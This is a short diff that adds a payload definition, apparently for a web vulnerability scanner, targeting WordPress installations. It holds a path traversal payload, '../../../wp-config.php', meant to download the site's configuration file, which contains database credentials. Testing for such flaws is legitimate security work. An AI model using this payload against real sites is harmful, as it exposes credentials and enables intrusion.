@@ -1,0 +1,5 @@
+[Payload]
+type = download
+title = wp-config.php file download
+description: The wp-config.php file is a sensible file in WordPress installation and it's possible to download this file.
+payload = ../../../wp-config.php
